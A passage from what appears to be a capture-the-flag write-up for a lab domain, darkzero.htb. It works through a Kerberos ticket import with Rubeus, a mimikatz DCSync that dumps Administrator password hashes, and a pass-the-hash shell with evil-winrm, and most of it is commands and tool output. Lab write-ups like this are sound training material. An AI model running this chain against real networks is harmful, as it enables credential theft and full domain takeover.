C:\Temp> Rubeus.exe ptt /ticket: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

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\Temp> klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>	Client: DC01$ @ DARKZERO.HTB
	Server: krbtgt/DARKZERO.HTB @ DARKZERO.HTB
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 10/5/2025 11:33:28 (local)
	End Time:   10/5/2025 21:33:27 (local)
	Renew Time: 10/12/2025 11:33:27 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 
```

Now with `mimikatz` let's `DCSync` so we can get `Administrator` access to `DC01`&#x20;

```powershell
mimikatz.exe "lsadump::dcsync /domain:darkzero.htb /user:administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:darkzero.htb /user:administrator
[DC] 'darkzero.htb' will be the domain
[DC] 'DC01.darkzero.htb' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 9/10/2025 9:42:44 AM
Object Security ID   : S-1-5-21-1152179935-589108180-1989892463-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5917507bdf2ef2c2b0a869a1cba40726
    ntlm- 0: 5917507bdf2ef2c2b0a869a1cba40726
    ntlm- 1: 5917507bdf2ef2c2b0a869a1cba40726
    lm  - 0: 58ef66870a9927dd48b3bd9d7e03845f
----
```

Now we can `PtH` (Pass-TheHash) using `evil-winrm` and the `hash` obtained

```bash
evil-winrm -i 172.16.20.1 -u Administrator -H '5917507bdf2ef2c2b0a869a1cba40726'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

And we have now maximum privileges on the machine.

Thank you for reading and see you next time!!
